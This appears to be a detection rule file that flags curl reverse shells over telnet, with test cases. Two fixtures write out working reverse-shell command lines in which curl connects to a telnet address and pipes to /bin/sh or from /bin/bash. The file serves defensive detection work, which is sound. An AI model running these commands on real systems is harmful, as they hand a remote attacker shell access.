name: rta_curl_telnet_reverse_shell
mode: alert
eval: |
  (
    e.process_name == "curl" &&
    re_match(e.process_args, "telnet://[0-9.]+:[0-9]+") &&
    re_match(e.process_args, "\\|")
  )
tests:
  - cleartext: "curl telnet protocol reverse shell"
    process_name: curl
    process_args: "curl telnet://10.10.10.10:4444 | /bin/sh"
    should_match: true
  - cleartext: "curl telnet with bash"
    process_name: curl
    process_args: "/bin/bash | curl telnet://192.168.1.1:8080"
    should_match: true
  - cleartext: "normal curl HTTP request"
    process_name: curl
    process_args: "curl https://example.com"
    should_match: false
